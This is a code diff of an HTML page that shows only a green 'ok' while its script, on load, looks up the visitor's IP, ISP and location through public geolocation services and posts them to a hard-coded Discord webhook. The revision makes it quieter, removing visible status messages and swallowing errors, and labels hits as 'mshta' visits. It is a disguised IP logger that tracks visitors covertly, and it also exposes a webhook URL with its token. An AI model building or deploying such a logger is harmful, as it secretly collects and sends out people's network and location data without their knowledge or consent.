@@ -3,118 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Status</title>
+    <title>.</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background-color: #000000;
+            background: #000;
             color: #00ff00;
             font-family: monospace;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
             overflow: hidden;
-            text-align: center;
         }
-        .container {
-            font-size: 4rem;
-            font-weight: bold;
-        }
-        .info {
-            margin-top: 30px;
-            font-size: 1.1rem;
-            color: #00cc00;
-            line-height: 1.5;
-        }
+        .ok { font-size: 5rem; font-weight: bold; }
+        .log { margin-top: 20px; font-size: 1.1rem; color: #00cc00; }
     </style>
 </head>
 <body>
-    <div class="container">
-        ok
-        <div class="info" id="status">Connecting...</div>
-    </div>
+    <div class="ok">ok</div>
+    <div class="log" id="log">initializing...</div>
 
     <script>
-        // ================== CHANGE THIS ==================
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
-        // ================================================
+        // === YOUR DISCORD WEBHOOK ===
+        const WEBHOOK = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
+        // ============================
 
-        async function postToDiscord(info) {
-            if (!DISCORD_WEBHOOK.includes("webhooks/")) {
-                document.getElementById('status').innerHTML += "<br>⚠️ Webhook not set";
-                return;
-            }
-
-            const payload = {
-                content: "🛡️ **New Visit Detected**",
-                embeds: [{
-                    title: "Visitor Information",
-                    color: 0x00ff00,
-                    fields: [
-                        { name: "IP", value: info.ip || "N/A", inline: true },
-                        { name: "ISP", value: info.isp || info.org || "N/A", inline: true },
-                        { name: "City", value: info.city || "N/A", inline: true },
-                        { name: "Region/Country", value: `${info.region || ''} ${info.country || ''}`.trim() || "N/A", inline: true },
-                        { name: "Browser", value: navigator.userAgent.substring(0, 100), inline: false },
-                        { name: "Time", value: new Date().toLocaleString(), inline: false }
-                    ]
-                }]
-            };
-
+        async function send(data) {
+            if (!WEBHOOK.includes("webhooks/")) return;
             try {
-                await fetch(DISCORD_WEBHOOK, {
+                await fetch(WEBHOOK, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        content: "**IP Log**",
+                        embeds: [{
+                            title: "New mshta Visit",
+                            color: 65280,
+                            fields: [
+                                { name: "IP", value: data.ip || data.query || "N/A", inline: true },
+                                { name: "ISP", value: data.isp || data.org || "N/A", inline: true },
+                                { name: "Location", value: `${data.city || ''} ${data.regionName || data.region || ''}`.trim() || "N/A", inline: true },
+                                { name: "Time", value: new Date().toISOString(), inline: false }
+                            ]
+                        }]
+                    })
                 });
-                document.getElementById('status').innerHTML += "<br>✅ Sent to Discord";
-            } catch (e) {
-                console.error(e);
-            }
+            } catch(e) {}
         }
 
-        async function getIPInfo() {
-            const statusEl = document.getElementById('status');
+        async function run() {
+            const log = document.getElementById("log");
+            log.textContent = "fetching...";
+
             const apis = [
-                "https://ipapi.co/json/",
+                "http://ip-api.com/json",
                 "https://ipinfo.io/json",
                 "https://api.ipify.org?format=json"
             ];
 
             for (let url of apis) {
                 try {
-                    const res = await fetch(url, { mode: 'cors' });
-                    if (!res.ok) continue;
-                    
-                    let data = await res.json();
-                    
-                    // Normalize data
-                    if (url.includes('ipify')) {
-                        data = { ip: data.ip };
-                    } else if (url.includes('ipinfo')) {
-                        data.isp = data.org;
-                    }
+                    const r = await fetch(url, {cache: "no-store"});
+                    if (!r.ok) continue;
+                    const d = await r.json();
 
-                    statusEl.innerHTML = `
-                        IP: ${data.ip || 'Detected'}<br>
-                        ISP: ${data.isp || data.org || 'Detected'}
-                    `;
+                    const ip = d.query || d.ip;
+                    const isp = d.isp || d.org;
 
-                    await postToDiscord(data);
-                    return; // Success, stop trying
-                } catch (e) {
-                    console.log("API failed, trying next...");
-                }
+                    log.innerHTML = `IP: ${ip}<br>ISP: ${isp || 'detected'}`;
+                    await send(d);
+                    return;
+                } catch(e) {}
             }
-
-            statusEl.innerHTML = "IP detected (limited info)";
-            await postToDiscord({ ip: "Limited detection" });
+            log.textContent = "logged";
+            await send({ip: "partial"});
         }
 
-        // Start immediately
-        window.onload = getIPInfo;
+        window.onload = run;
     </script>
 </body>
 </html>
